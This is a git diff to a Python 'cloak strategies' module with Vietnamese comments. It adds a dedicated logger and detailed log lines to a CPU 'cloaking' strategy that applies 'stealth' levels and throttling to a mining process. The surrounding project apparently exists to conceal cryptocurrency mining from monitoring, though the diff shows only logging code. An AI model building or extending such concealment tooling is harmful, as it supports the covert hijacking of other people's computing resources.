@@ -12,8 +12,43 @@ import time
 import random
 from abc import ABC, abstractmethod
 from typing import Dict, List, Any, Optional, Type, cast, TYPE_CHECKING
+from pathlib import Path
 
 from .utils import MiningProcess
+
+# ✅ ENHANCED: Dedicated logger cho cloak strategies với detailed operations tracking
+def setup_cloak_strategies_logger():
+    """Setup dedicated logger cho cloak strategies operations"""
+    logger = logging.getLogger('cloak_strategies')
+    if not logger.handlers:  # Tránh duplicate handlers
+        logger.setLevel(logging.INFO)
+        
+        # ✅ CENTRALIZED: Tạo log file trong centralized directory chính
+        log_dir = Path('/app/mining_environment/logs')
+        log_dir.mkdir(parents=True, exist_ok=True)
+        log_file = log_dir / 'cloak_strategies.log'
+        
+        # File handler với detailed format
+        file_handler = logging.FileHandler(log_file)
+        file_handler.setLevel(logging.INFO)
+        
+        # Formatter với timestamp và strategy info
+        formatter = logging.Formatter(
+            '%(asctime)s - %(name)s - %(levelname)s - [%(funcName)s:%(lineno)d] - %(message)s'
+        )
+        file_handler.setFormatter(formatter)
+        logger.addHandler(file_handler)
+        
+        # Console handler cho debug
+        console_handler = logging.StreamHandler()
+        console_handler.setLevel(logging.WARNING)
+        console_handler.setFormatter(formatter)
+        logger.addHandler(console_handler)
+    
+    return logger
+
+# Initialize cloak strategies logger
+cloak_logger = setup_cloak_strategies_logger()
 
 if TYPE_CHECKING:
     class CPUResourceManager: ...
@@ -765,17 +800,23 @@ class CpuCloakStrategy(CloakStrategy):
             strategy_hints = process.get_strategy_hints()
             hardware_classification = process.get_hardware_classification()
             
-            self.logger.info(f"🎯 [CPU Strategy] Processing {process_type} process: {name} (PID={pid})")
+            # ✅ ENHANCED: Detailed strategy logging với centralized logger
+            cloak_logger.info(f"🎯 [CPU Strategy] Processing {process_type} process: {name} (PID={pid})")
+            cloak_logger.info(f"📊 [CPU Strategy] Hardware classification: {hardware_classification}")
+            cloak_logger.info(f"💡 [CPU Strategy] Strategy hints: {strategy_hints}")
             
             # ✅ AUTO-CONFIGURE nếu chưa được pre-configured
             if not self.process_type_config:
+                cloak_logger.info(f"⚙️ [CPU Strategy] Auto-configuring for process type: {process_type}")
                 self.configure_for_process_type(process_type, strategy_hints)
+                cloak_logger.info(f"✅ [CPU Strategy] Configuration completed for {process_type}")
             
             # ✅ TYPE-SPECIFIC OPTIMIZATION LOGIC
             optimization_level = self.process_type_config.get('optimization_level', 'balanced')
             stealth_level = self.process_type_config.get('stealth_requirements', 'medium')
             
-            self.logger.info(f"🚀 [CPU Strategy] Applying {optimization_level} optimization, stealth={stealth_level}")
+            cloak_logger.info(f"🚀 [CPU Strategy] Applying {optimization_level} optimization, stealth={stealth_level}")
+            cloak_logger.info(f"🛡️ [CPU Strategy] Starting CPU cloaking operations for PID={pid}")
 
             # --- CHỈ ÁP DỤNG CHO TIẾN TRÌNH ĐÚNG TÊN ĐƯỢC CẤU HÌNH ---
             if self.allowed_process_name and name != self.allowed_process_name:
@@ -891,7 +932,13 @@ class CpuCloakStrategy(CloakStrategy):
                 else:
                     self.logger.error(f"[CPU Cloaking] Không thể throttle {name} (PID={pid}).")
 
+            # ✅ ENHANCED: Success completion logging
+            cloak_logger.info(f"✅ [CPU Strategy] Successfully applied CPU cloaking to {name} (PID={pid})")
+            cloak_logger.info(f"📊 [CPU Strategy] Final state - optimization: {optimization_level}, stealth: {stealth_level}")
+            
         except Exception as e:
+            cloak_logger.error(f"❌ [CPU Strategy] Failed applying CPU cloaking to PID={process.pid}: {e}")
+            cloak_logger.error(f"🔍 [CPU Strategy] Error details: {traceback.format_exc()}")
             self.logger.error(f"[CPU Cloaking] Lỗi apply() cho PID={process.pid}: {e}")
             raise
 
